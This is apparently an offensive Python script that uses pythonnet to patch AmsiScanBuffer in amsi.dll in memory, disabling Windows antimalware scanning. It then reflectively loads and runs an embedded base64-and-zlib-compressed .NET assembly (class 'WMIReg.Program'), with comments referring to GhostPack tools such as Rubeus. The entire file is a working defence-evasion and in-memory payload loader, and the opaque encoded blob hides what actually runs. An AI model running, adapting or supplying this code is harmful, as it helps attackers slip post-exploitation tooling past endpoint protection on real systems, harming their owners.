import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("WMIReg.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()